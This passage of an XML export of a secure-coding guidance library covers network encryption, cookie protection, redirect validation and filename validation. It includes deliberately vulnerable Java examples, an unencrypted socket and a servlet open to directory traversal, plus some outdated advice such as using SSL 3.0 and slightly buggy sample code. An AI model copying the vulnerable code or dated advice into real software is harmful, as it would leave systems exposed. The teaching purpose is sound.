Enumerate all connections between the different servers with other servers or with the application. Identify the sensitive data that is sent over the network and the respective connections that are used for such communication.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Choose the appropriate encryption mechanism. &lt;/strong&gt;Depending on the infrastructure, you may consider using IPSec or TLS/SSL.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;IPSec:&lt;/strong&gt; IPSec is used when the encryption needs to be applied across all involved parties. Since IPSec is designed to secure connections between static hosts that are &amp;quot;always on,&amp;quot; use IPSec to secure the network connections between your
 application's servers. Due to its nature, IPSec requires low level support; therefore0, your application would need support from the operating system or a JNI component to manage it.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;TLS/SSL:&lt;/strong&gt; TLS/SSL provides a granular protection which&amp;nbsp;allows only&amp;nbsp;the traffic containing sensitive data to be encrypted. Because TLS/SSL has a certificate based design, it allows the protection of data between mobile hosts. Use TLS/SSL
 to secure the communication channel between your application and its users.&lt;br&gt;
&lt;br&gt;
While Java provides APIs for handling SSL encrypted traffic, it is recommended to follow the manuals associated with the&amp;nbsp;third party software that&amp;nbsp;is being used. For example, if your application connects to a database server, follow the database server's manual
 on setting up the encryption; if your application is web-oriented, follow the web server's documentation on setting up the SSL certificate. If your application uses SSL, ensure that you use SSL 3.0 and disable the cryptographically weak SSL 2.0 protocols.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Apply the appropriate encryption mechanism. &lt;/strong&gt;Apply the encryption mechanism of choice at the appropriate locations in the code. Such locations include all functionality that establishes a connection between your application and another entity.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code establishes a connection between&amp;nbsp;two servers. Unfortunately, the communication is not encrypted; therefore, it is possible for an attacker to eavesdrop on the connection.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;String remoteHost = &amp;quot;server02.example.com&amp;quot;;&lt;br&gt;int remotePort = &amp;quot;1337&amp;quot;;&lt;br&gt; &lt;br&gt;Socket sock = new Socket(remoteHost, remotePort);&lt;br&gt;InputStreamReader isr = new InputStreamReader(sock.getInputStream());&lt;br&gt;BufferedReader input = new BufferedReader(isr);&lt;br&gt;PrintWriter output = new PrintWriter(sock.getOutputStream(), true);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code establishes a connection between&amp;nbsp;two servers. Because the communication is encrypted, the confidentiality of the data in transit is preserved; therefore, it is impossible for an attacker to eavesdrop on the connection.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;String remoteHost = &amp;quot;server02.example.com&amp;quot;;&lt;br&gt;int remotePort = &amp;quot;1337&amp;quot;;&lt;br&gt; &lt;br&gt;SSLSocketFactory sslSF = (SSLSocketFactory)SSLSocketFactory.getDefault();&lt;br&gt;SSLSocket sslSock = (SSLSocket) sslSF.createSocket(remoteHost, remotePort);&lt;br&gt; &lt;br&gt;InputStreamReader isr = new InputStreamReader(sslSock.getInputStream());&lt;br&gt;BufferedReader input = new BufferedReader(isr);&lt;br&gt;PrintWriter output = new PrintWriter(sslSocket.getOutputStream(), true);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about TLS, see: RFC for &lt;a href="http://www.faqs.org/rfcs/rfc2246.html"&gt;
Transport Layer Security&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For more information about Java SSL sockets, see: Documentation for &lt;a href="http://download.oracle.com/javase/1.4.2/docs/api/javax/net/ssl/SSLSocket.html"&gt;
Class SSLSocket&lt;/a&gt; in Java SDK. &lt;/li&gt;&lt;li&gt;To learn about the JSSE API, see: &lt;a href="http://download.oracle.com/javase/1.4.2/docs/guide/security/jsse/JSSERefGuide.html"&gt;
Java Secure Socket Extension (JSSE) Reference Guide&lt;/a&gt; available from Oracle. &lt;/li&gt;&lt;li&gt;For a tutorial about using the JSSE API, see: &lt;a href="http://www.javaworld.com/javaworld/jw-05-2001/jw-0511-howto.html"&gt;
Build secure network applications with SSL and the JSSE API&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For a quick overview on IPSec, see: A publication on &lt;a href="http://www.digisafe.com/products/pdf/IPSec_Primer.pdf"&gt;
IPSec Primer&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:024B6044-7C89-436C-8111-1B6FAE7298AC"&gt;Guideline: Protect Sensitive Data Over the Network (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:ED6F49C0-E021-459E-AE4F-9116CA8E8073"&gt;Guideline: Use SSL When Transmitting Credentials (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D"&gt;Attack: Man in the Middle Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:CBB29250-7ED3-4FDD-9B28-E3EE07EAF911"&gt;Attack: HTTP Replay Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:DEBB5734-39D0-4922-BDEE-1E0547E22DAD"&gt;Attack: Chosen Plaintext Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:3B657A67-F660-4DB5-9267-6E0FE2DAA1EB"&gt;Attack: Chosen Ciphertext Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:13EE90D9-B0F6-45D6-913A-BA8527525A04"&gt;Attack: Traffic Analysis Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:24D078E3-A02F-4EDF-A6EA-DA0E3E5FFE5E"&gt;Attack: Key Bruteforce Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B446B34C-8DEC-4F74-A392-C30D1719D90D"&gt;Attack: Trust Relationship Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:9E3FC30A-B55C-4AF6-8B77-A534C6F87197"&gt;Attack: Phishing Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:AFC86927-1116-4207-B604-55FE690C298B"&gt;Checklist Item: Communication Links are Encrypted (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>de9d7b57-067f-46c9-9709-aebbb40f69da</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Encrypt the Contents of the Authentication Cookies</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Session Management</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web Application&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Cookies should be encrypted and checked for integrity to detect tampering even over an SSL channel because cookies can be stolen through cross-site scripting (XSS) attacks.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;To ensure that cookie contents are not read and not tampered with, because&amp;nbsp;cookies can be stolen, even over a Secure Sockets Layer (SSL) channel using cross-site scripting attacks.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;This guideline should be used for all applications that use Forms Authentication should have their cookies encrypted.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Encrypt the cookie contents even if you are using SSL. This prevents an attacker viewing or modifying the cookie if he manages to steal it through an XSS attack. In this event, the attacker could still use the cookie to access your application, but only
 while the cookie remains valid.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information see, &amp;quot;Chapter 4 - Design Guidelines for Secure Web Applications&amp;quot; at
&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx"&gt;http://msdn2.microsoft.com/en-us/library/aa302420.aspx&lt;/a&gt;&amp;nbsp;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>e0cb34c8-d92a-4f52-9fad-38f75c7d5edb</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use SSL to Protect Session Authentication Cookies</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Session Management</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web Application&amp;nbsp;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;You must protect the authentication cookie&amp;nbsp;with SSL. &lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;To prevent session hijacking and cookie replay attacks, secure the cookie by making sure that it is only passed over SSL connections using the HTTPS protocol. For additional risk mitigation, encrypt the cookie before sending it to the client and limit the
 period for which the cookie is valid. &lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;When&amp;nbsp;you use Forms authentication, make sure your application encrypts the authentication cookies using the
&lt;strong&gt;protection=&amp;quot;All&amp;quot;&lt;/strong&gt; attribute on the &lt;strong&gt;&amp;lt;forms&amp;gt; &lt;/strong&gt;element. This practice is recommended in addition to SSL to mitigate the risk of an XSS attack that manages to steal the authentication cookie of a user.&amp;nbsp;
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Do not pass authentication cookies over HTTP connections. Set the secure cookie property within authentication cookies, which instructs browsers to send cookies back to the server only over HTTPS connections. For more information, see Chapter&amp;nbsp;10, &amp;quot;Building
 Secure ASP.NET Web Pages and Controls.&amp;quot;&lt;/p&gt;
&lt;p&gt;If you are using .NET Framework version 1.1, set the secure property by using &lt;strong&gt;
requireSSL=&amp;quot;true&amp;quot;&lt;/strong&gt; on the &lt;strong&gt;&amp;lt;forms&amp;gt;&lt;/strong&gt; element as follows:&lt;/p&gt;
&lt;div&gt;
&lt;div&gt;&lt;/div&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;forms loginUrl=&amp;quot;Secure\Login.aspx&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; requireSSL=&amp;quot;true&amp;quot; . . . /&amp;gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;p&gt;If you are using .NET Framework version 1.0, set the secure property manually in the
&lt;strong&gt;Application_EndRequest&lt;/strong&gt; event handler in Global.asax using the following code:&lt;/p&gt;
&lt;div&gt;
&lt;div&gt;&lt;/div&gt;
&lt;div&gt;
&lt;pre&gt;protected void Application_EndRequest(Object sender, EventArgs e) &lt;br&gt;{&lt;br&gt;&amp;nbsp; string authCookie = FormsAuthentication.FormsCookieName;&lt;br&gt;&lt;br&gt;&amp;nbsp; foreach (string sCookie in Response.Cookies) &lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (sCookie.Equals(authCookie))&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; { &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; // Set the cookie to be secure. Browsers will send the cookie&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; // only to pages requested with https&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Cookies[sCookie].Secure = true;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp; }&lt;br&gt;}&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Design Guidelines for Secure Web Applications &lt;a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx"&gt;
http://msdn2.microsoft.com/en-us/library/aa302420.aspx&lt;/a&gt; &lt;/li&gt;&lt;li&gt;Architecture and Design Review for Security &lt;a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx"&gt;
http://msdn2.microsoft.com/en-us/library/aa302420.aspx&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>e1244c90-1c7c-42ec-8de4-87998a2cd8a9</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Validate Destinations of Redirects and Forwards</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web Applications&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Validate destinations of redirects or forwards.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;If destinations of redirects or forwards are not validated, an attacker may create hyperlinks that appear to point to legitimate sites, but actually point to malicious pages controlled by the attacker. This technique is often used by phishers to trick people
 into visiting fake sites that steal authentication credentials. In some cases, a user may gain unauthorized access by manipulating redirect or forward parameters, if destinations are not validated.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Use this guideline when writing a web application that uses redirects or forwards. Avoid using redirects or forwards in web applications, if possible.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Perform the following actions to assure validation of redirects and forwards:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify redirects and forwards.&lt;/strong&gt; Review code to find all redirects and forwards.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Map destinations.&lt;/strong&gt; Make a list of all destinations for each redirect and forward. Define mapping values for all destinations used by redirects and forwards. A mapping value is a short identifying string that symbolically represents a resource.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Define access permissions.&lt;/strong&gt; Determine circumstances under which it is acceptable for each user role to access each destination.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Validate redirects.&lt;/strong&gt; Rewrite redirects and forwards to use mapping values as input to calculate the final destinations of redirects or forwards. Add validation routines to verify that the user has permissions to access the resource, which
 is the destination of the redirect or forward.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about unvalidated redirects and forwards, please see &lt;a href="http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards"&gt;
http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:83896e9e-a4cd-434c-980a-276c660984da"&gt;Use Mapping Values When Redirecting on User Input&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:9680fe6b-230c-4794-9777-cae02aa597d7"&gt;URL Redirection Attack&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1b4602a7-88c5-4255-8f39-4fae73546608"&gt;How to Test for URL Redirection Bugs&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:15e88928-1cbc-4fdd-8640-90319c81c178"&gt;Phishing Attack&lt;br&gt;
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>e2762d56-fcc1-4677-b955-d97fdce23646</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Filter All User-Supplied Filename and Path Input</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;p&gt;Applications written using Servlets or JSP.&lt;/p&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Carefully validate filename and path input. Apply whitelist techniques when validating input.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Filenames and paths interact directly with the underlying filesystem. Allowing malicious users to manipulate file system operations directly or indirectly through their input can expose important sensitive system files. Canonicalization vulnerabilities can
 result in an attacker gaining access to unexpected resources.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your user input is used to help construct filenames or file paths, carefully validate to ensure the input is not used to gain access to unexpected resources.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Use the following steps when validating filename and path input:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Establish a base directory. &lt;/strong&gt;The base directory is where your application should store any user-supplied files.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The location of the base directory should be carefully chosen. It should not be a subdirectory of any important directory such as
&lt;strong&gt;/etc&lt;/strong&gt; or &lt;strong&gt;c:\windows&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Write access should be allowed only to the base directory and its children, but not to its parents.
&lt;/li&gt;&lt;li&gt;Because of read access misuses, it is recommended that no sensitive information is stored inside any of the base directory's parents.
&lt;/li&gt;&lt;li&gt;Read/write access outside the base directory and its parents should be prohibited. This can be achieved via whitelist validation on the user-supplied filename and strict access control from the filesystem.
&lt;/li&gt;&lt;li&gt;Avoid setting your application's local user account as owner of any of the base directory's parents.&lt;br&gt;
&lt;br&gt;
&lt;strong&gt;Note:&lt;/strong&gt; If your application is Windows based, create your base directory in a partition different than the partition hosting all critical system services. Because Windows prohibits changing partitions through canonicalization, it is impossible
 for an attacker to access a resource that is located in another partition. For instance, if your Windows installation is located at
&lt;strong&gt;c:\windows&lt;/strong&gt;, place your base directory at &lt;strong&gt;d:\myapp\temp&lt;/strong&gt;.
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Validate using whitelisting. &lt;/strong&gt;The syntax for accessing filesystems is well known. Use whitelist techniques to allow good input and discard bad input. Be careful with canonicalization issues. Canonicalization problems occur when the user attempts
 to execute directory traversal by using special pathname sequences to direct your application into a directory it should not access.
&lt;br&gt;
&lt;br&gt;
Example:&lt;br&gt;
&lt;br&gt;
Assume your application has created the file&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;d:\myapp\temp\file.dat&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;The following strings can also represent the same file:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;d:\myapp\temp\..\temp\file.datd:\myapp\temp\..\temp\..\temp\file.datd%3A%5Cmyapp%5Ctemp%5Cfile.dat&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;Canonicalization problems can be avoided by using whitelist techniques and setting the right permissions at the filesystem level. If your application knows the file structure within the base directory, the following code can be applied:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean validateFilename(File file) throws IOException, SecurityException&lt;br&gt;{&lt;br&gt;      // This represents the format d:\myapp\temp\&amp;lt;file name&amp;gt; where the file name&lt;br&gt;      // can consist of alpha-numeric, space/tab, period, and dash characters and&lt;br&gt;      // cannot exceed 20 characters in length&lt;br&gt;      String goodPattern = &amp;quot;d:(&lt;a&gt;\\\\|/)myapp(\\\\|/)temp(\\\\|/)(\\w|\\s|\\.|-|){1,20&lt;/a&gt;}&amp;quot;;&lt;br&gt;      Pattern p = Pattern.compile(goodPattern, Pattern.CASE_INSENSITIVE);&lt;br&gt;      Matcher m = p.matcher(file.getCanonicalPath());&lt;br&gt;       if (!m.matches())&lt;br&gt;      {&lt;br&gt;            return false;&lt;br&gt;      }&lt;br&gt;       return true;&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;Filesystem permissions are also a very important mechanism for avoiding canonicalization problems. Restricting the access rights of your application's local account can prevent access to sensitive system data. It is recommended that:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;full access is given only within the base directory &lt;/li&gt;&lt;li&gt;read access is given only within the base directory's parents &lt;/li&gt;&lt;li&gt;no access is given anywhere else on the filesystem&lt;br&gt;
&lt;br&gt;
It is also recommended to execute your application with its own local account rather than as the hosting server; therefore, any restrictions applied to your application would not affect the performance of the hosting server.
&lt;br&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Avoid common mistakes.&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use the Java File object.&lt;/strong&gt; Always use a &lt;strong&gt;java.io.File&lt;/strong&gt; object instead of a
&lt;strong&gt;String&lt;/strong&gt; object to represent a file. Using the &lt;strong&gt;File&lt;/strong&gt; object allows you to access the actual file and some useful and relevant information such as the file's size, parent, path, etc. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;File file = new File(&amp;quot;d:\myapp\temp\file.dat&amp;quot;);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify the canonical path.&lt;/strong&gt; The &lt;strong&gt;File&lt;/strong&gt; object provides the file's path in&amp;nbsp;three different forms -- original, absolute and canonical. Always use the canonical path when using whitelisting to verify the file's path.
&lt;/p&gt;
&lt;p&gt;For instance, the file &lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;d:\myapp\temp\..\temp\..\temp\file.dat&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;would have the following paths:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;d:\myapp\temp\..\temp\..\temp\file.dat&lt;br&gt; (Original via the &lt;strong&gt;File.getPath&lt;/strong&gt; method)&lt;br&gt;d:\myapp\temp\..\temp\..\temp\file.dat&lt;br&gt; (Absolute via the &lt;strong&gt;File.getAbsolutePath&lt;/strong&gt; method)&lt;br&gt;D:\myapp\temp\file.dat&lt;br&gt; (Canonical via the &lt;strong&gt;File.getCanonicalPath&lt;/strong&gt; method)&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify&amp;nbsp;that the filesystem is case-sensitive.&lt;/strong&gt; Always be sure&amp;nbsp;that your application's filesystem is case-sensitive. Because most UNIX based operating systems have case-sensitive filesystems,
&lt;strong&gt;FILE.DAT&lt;/strong&gt; and &lt;strong&gt;file.dat&lt;/strong&gt; represent&amp;nbsp;two different files. However, Windows has a case-insensitive filesystem; therefore,
&lt;strong&gt;FILE.DAT&lt;/strong&gt; and &lt;strong&gt;file.dat&lt;/strong&gt; represent the same file. If your application's filesystem is case-insensitive, make sure to specify the CASE_INSENSITIVE flag when using regular expressions to validate your file inputs. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;String goodPattern = &amp;quot;d:(&lt;a&gt;\\\\|/)myapp(\\\\|/)temp(\\\\|/)(\\w|\\s|\\.|-|){1,20&lt;/a&gt;}&amp;quot;;&lt;br&gt;Pattern p = Pattern.compile(goodPattern, Pattern.CASE_INSENSITIVE);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify the filesystem's path delimiters.&lt;/strong&gt; Verify the path delimiters that your application's filesystem uses and keep them consistent throughout the code. For example, Windows uses '&lt;strong&gt;\&lt;/strong&gt;' or '&lt;strong&gt;/&lt;/strong&gt;' to distinguish
 directories inside a path while UNIX based systems use only '&lt;strong&gt;/&lt;/strong&gt;' to accomplish the same task.&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code allows the user to read the contents of a report file, located in
&lt;strong&gt;/myapp/temp/&lt;/strong&gt;. Unfortunately, the code is missing filename validation; therefore, the application is exposed to a directory traversal attack:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import java.lang.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt; public final class ReportDownloader extends HttpServlet&lt;br&gt;{&lt;br&gt;      public void doGet(HttpServletRequest request,&lt;br&gt;            HttpServletResponse response) throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            response.setContentType(&amp;quot;application/vnd.ms-excel&amp;quot;);&lt;br&gt;            String baseDir = &amp;quot;/myapp/temp/&amp;quot;;&lt;br&gt;            PrintWriter out = response.getWriter();&lt;br&gt;            String filename = request.getParameter(&amp;quot;file&amp;quot;);&lt;br&gt;            BufferedReader fin;&lt;br&gt;            String data = &amp;quot;&amp;quot;;&lt;br&gt;             try&lt;br&gt;            {&lt;br&gt;                  File reportFile = new File(baseDir &amp;#43; filename);&lt;br&gt;                  // The application fails to validate the user-supplied filename&lt;br&gt;                  fin = new BufferedReader(new FileReader(reportFile));&lt;br&gt;                  StringBuilder sb = new StringBuilder();&lt;br&gt;                  while (data != null)&lt;br&gt;                  {&lt;br&gt;                        data = fin.readLine();&lt;br&gt;                        if (validateData(data))&lt;br&gt;                        {&lt;br&gt;                              sb.append(data);&lt;br&gt;                        }&lt;br&gt;                        else&lt;br&gt;                        {&lt;br&gt;                              // Add the appropriate logging and exception handling&lt;br&gt;                              // mechanisms. Consult the Exception Handling and&lt;br&gt;                              // Logging sections&lt;br&gt;                              out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                                        &amp;#43; &amp;quot;Please try again later.&amp;quot;);&lt;br&gt;                              return;&lt;br&gt;                        }&lt;br&gt;                  }&lt;br&gt;                  out.println(sb.toString());&lt;br&gt;            }&lt;br&gt;            catch (Exception e)&lt;br&gt;            {&lt;br&gt;                  // Add the appropriate logging and exception handling mechanisms&lt;br&gt;                  // Consult the Exception Handling and Logging sections&lt;br&gt;                  out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                            &amp;#43; &amp;quot;Please try again later.&amp;quot;);&lt;br&gt;            }&lt;br&gt;             out.flush();&lt;br&gt;             out.close();&lt;br&gt;      }&lt;br&gt;       boolean validateData(String input)&lt;br&gt;      {&lt;br&gt;             // Implement a validation routine for the format of the reports&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code allows the user to read the contents of a report file, located in
